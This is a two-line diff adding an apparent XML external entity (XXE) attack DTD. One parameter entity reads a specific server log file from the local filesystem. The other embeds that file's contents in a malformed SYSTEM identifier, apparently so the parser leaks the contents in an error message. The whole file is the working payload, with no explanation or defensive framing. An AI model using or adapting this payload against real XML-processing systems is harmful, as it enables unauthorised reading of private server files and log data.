@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///opt/browsersoft/node/root/deployments/LACIE_CERT_13_7_9/log/log_2020_11_24_17_29_34.log">
+<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
